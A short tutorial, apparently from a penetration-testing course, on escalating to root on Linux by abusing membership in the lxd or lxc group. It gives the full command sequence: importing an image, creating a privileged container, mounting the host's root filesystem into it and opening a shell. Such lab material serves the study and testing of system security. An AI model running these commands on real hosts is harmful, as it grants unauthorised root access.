#### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

```
id
```

```shell-session
cd ContainerImages
ls
```

```shell-session
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
```
```shell-session
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.
```shell-session
lxc start privesc
```

```
lxc exec privesc /bin/bash
```
or
```
lxc exec privesc /bin/sh
```

You are now root
